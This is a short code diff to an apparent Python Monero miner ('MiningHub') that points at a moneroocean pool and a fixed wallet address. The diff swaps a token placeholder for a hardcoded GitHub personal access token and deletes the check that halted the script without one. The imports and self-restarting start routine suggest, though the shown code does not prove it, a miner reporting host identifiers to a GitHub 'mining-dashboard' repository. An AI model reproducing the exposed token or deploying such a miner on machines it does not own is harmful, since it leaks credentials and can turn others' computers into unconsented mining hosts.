@@ -1,7 +1,7 @@
 import hashlib,json,os,platform,socket,threading,time,urllib.request,base64,uuid
 GITHUB_USER="max1734601-cpu"
 GITHUB_REPO="mining-dashboard"
-GITHUB_TOKEN="YOUR_TOKEN_HERE"
+GITHUB_TOKEN="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"
 WALLET="4465bM7hTwiMHE3ka1foxQMou8YsrMtR4RYFmyJF23KSSp6fHtDcE8LUcUrRbKTQEJPYkKgUqfDyG6TvmcwRJ8UUHVxpc9o"
 POOL="gulf.moneroocean.stream"
 PORT=10032
@@ -92,9 +92,6 @@ class Miner:
    time.sleep(30)
  def start(self):
   print(f"[*] MiningHub - {self.id}")
-  if GITHUB_TOKEN=="YOUR_TOKEN_HERE":
-   print("[-] Set GITHUB_TOKEN in miner.py first!")
-   return
   if not self.connect():
    time.sleep(30)
    return self.start()
